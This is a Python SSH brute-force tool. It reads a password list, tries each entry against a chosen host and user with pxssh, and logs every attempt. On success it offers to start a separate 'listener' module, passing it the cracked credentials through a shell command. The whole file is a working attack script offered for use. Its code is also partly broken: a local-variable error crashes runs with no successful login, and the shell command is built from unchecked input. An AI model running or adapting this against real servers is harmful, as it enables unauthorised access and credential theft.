import time
import sys
import os
from pexpect import pxssh
import argparse
import threading

method = 'ssh'
purple = '\033[95m'
blue = '\033[94m'
green = '\033[92m'
yellow = '\033[93m'
red = '\033[91m'
default = '\033[0m'
underline = '\033[4m'
orange = '\033[33m'

password_true = ''
parser = argparse.ArgumentParser()
parser.add_argument('host', help='Target host')
parser.add_argument('user', help='Target username')
parser.add_argument('password', help='Target password file')
args = parser.parse_args()

if args.host and args.user and args.password:
	HOST = args.host
	USER = args.user
	
	try:
		PASSWORD = open(args.password, 'r')
		print(purple+'[*]'+default+' Open file password'+default)
	except:
		print(red+'[--] File not found'+default)
		exit(0)
else:
	print('Error ! Check monual programm')
	exit(0)


def brut():
	print(green+'Start brut SSH')
	for line in PASSWORD:
		password = line.strip('\r\n')
		s = pxssh.pxssh()
		try:
			s.login(HOST, USER, password)
			print(purple+time.ctime()+' '+green+'SSH connect user->'+blue+USER+green+' paswword-> '+blue+password+default)
			password_true = password
			break
		except:
			#print(error)
			print(purple+time.ctime()+' '+default+'Not work user-> '+blue+USER+default+' paswword-> '+blue+password+default)
	if password_true == '':
		print(green+' Not open sesssion')
		sys.exit(1)
	print(red+'Open session!!'+default)
	print('Start HunListener ??')
	y = input('Y/n>')
	if y == 'Y' or y == 'y':
		os.chdir('modules/')
		comand = 'python hun_listener.py '+ HOST +' '+USER+' '+' '+password_true+' '+method
		os.system(comand)
	else:
		sys.exit(1)
t1 = threading.Thread(target=brut)
t1.start()